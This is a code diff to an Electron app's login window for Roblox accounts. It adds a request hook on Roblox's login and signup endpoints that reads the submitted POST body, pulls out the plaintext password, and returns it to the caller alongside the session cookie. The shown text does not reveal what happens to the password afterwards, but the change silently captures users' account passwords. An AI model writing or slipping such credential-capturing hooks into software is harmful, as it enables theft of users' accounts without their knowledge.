@@ -62,11 +62,25 @@ function guardNavigation(view: { webContents: Electron.WebContents }): void {
   })
 }
 
-export async function openLogin(parent?: BrowserWindow): Promise<string | null> {
+const LOGIN_POSTS = ['https://auth.roblox.com/v2/login', 'https://auth.roblox.com/v2/signup']
+
+export async function openLogin(parent?: BrowserWindow): Promise<{ cookie: string; password: string } | null> {
   const partition = `trapram-login-${randomUUID()}`
   const ses = session.fromPartition(partition)
   harden(ses)
   await ses.clearStorageData()
+
+  let password = ''
+  ses.webRequest.onBeforeRequest({ urls: LOGIN_POSTS }, (details, cb) => {
+    const raw = details.uploadData?.[0]?.bytes?.toString('utf8')
+    if (raw) {
+      try {
+        const typed = (JSON.parse(raw) as { password?: unknown }).password
+        if (typeof typed === 'string' && typed) password = typed
+      } catch {}
+    }
+    cb({})
+  })
 
   const win = new BrowserWindow({
     width: 520,
@@ -80,13 +94,13 @@ export async function openLogin(parent?: BrowserWindow): Promise<string | null> 
   })
   guardNavigation(win)
 
-  return new Promise<string | null>((resolve) => {
+  return new Promise<{ cookie: string; password: string } | null>((resolve) => {
     let settled = false
-    const finish = (value: string | null) => {
+    const finish = (cookie: string | null) => {
       if (settled) return
       settled = true
       ses.clearStorageData().catch(() => undefined)
-      resolve(value)
+      resolve(cookie ? { cookie, password } : null)
       if (!win.isDestroyed()) win.destroy()
     }
 
